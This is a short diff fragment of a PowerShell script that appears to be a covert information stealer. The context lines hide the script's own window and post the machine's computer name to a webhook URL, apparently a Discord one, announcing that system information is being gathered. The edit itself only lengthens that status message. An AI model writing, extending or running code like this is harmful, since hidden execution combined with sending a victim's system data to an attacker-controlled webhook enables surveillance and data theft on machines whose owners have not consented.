@@ -16,7 +16,7 @@ else{
     $hwnd = $Proc.MainWindowHandle
     $Type::ShowWindowAsync($hwnd, 0)
 }
-$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME`` :computer:"} | ConvertTo-Json
+$jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = ":computer: ``Gathering System Information for $env:COMPUTERNAME.. Please wait`` :computer:"} | ConvertTo-Json
 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
 
 Add-Type -AssemblyName System.Windows.Forms
